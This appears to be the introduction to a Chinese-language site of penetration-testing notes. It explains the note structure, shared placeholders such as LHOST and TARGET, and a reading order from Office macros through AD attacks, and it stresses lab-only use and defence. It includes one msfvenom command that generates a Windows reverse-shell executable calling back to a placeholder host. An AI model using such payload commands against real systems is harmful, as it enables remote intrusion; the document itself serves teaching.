# 怎么读这些笔记

每篇主题大致按同一结构写：

1. **先判断什么** — 动手前要分清的限制条件
2. **公开工具 / 命令模板** — 需要你自己的实验环境
3. **失败时怎么分类** — 换路线，而不是反复改同一个文件
4. **防御侧** — 同一机制在企业里怎么加固

## 占位符

全站统一，不要自创另一套：

| 占位符 | 含义 |
|---|---|
| `LHOST` | 攻击机可达地址 |
| `LPORT` | 监听端口 |
| `TARGET` | 目标 IP 或主机名 |
| `DOMAIN` | AD 域名 |
| `USER` / `PASS` / `NTHASH` | 凭据 |
| `URL` | 你在实验网里的投递地址 |

示例域名一律用 `corp.example`、`dc01.corp.example`，不要照抄任何付费靶场的主机名。

## 和「改 IP 就能打」的资料有何不同

那类资料会附带完整 runner、webshell、绕过脚本。这里只保留：

- 为什么这条路会失败（静态特征 / 行为 / 位数 / 代理上下文）
- 公开工具叫什么、官方文档在哪
- 实验室里该观察哪些日志

自己的 payload 请在隔离网里生成。例如：

```bash
# 这是公共工具的通用语法，不是本站提供的马
msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o lab.bin
```

生成物不要提交到这个 Git 仓库，也不要放到 GitHub Pages。

## 推荐阅读顺序

入口相关：Office 宏 → HTA → WSH → DLL 旁加载 → AppLocker / AMSI  
立足之后：Windows 提权 → 凭据 → 出网 → 隧道  
域内：MSSQL → AD → WinRM  
其它：Linux、Kiosk / JEA / JIT、日历邀请
